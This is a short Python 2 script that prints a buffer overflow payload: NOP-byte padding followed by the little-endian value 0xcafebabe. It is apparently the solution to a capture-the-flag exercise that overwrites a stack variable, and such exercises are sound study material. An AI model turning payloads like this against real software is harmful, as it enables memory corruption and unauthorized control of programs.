from struct import *

p = lambda x : pack("<L", x)

NSled = "\x90"*(0x2c+8)
deadtocafe = p(0xcafebabe)

payload = NSled + deadtocafe

print payload
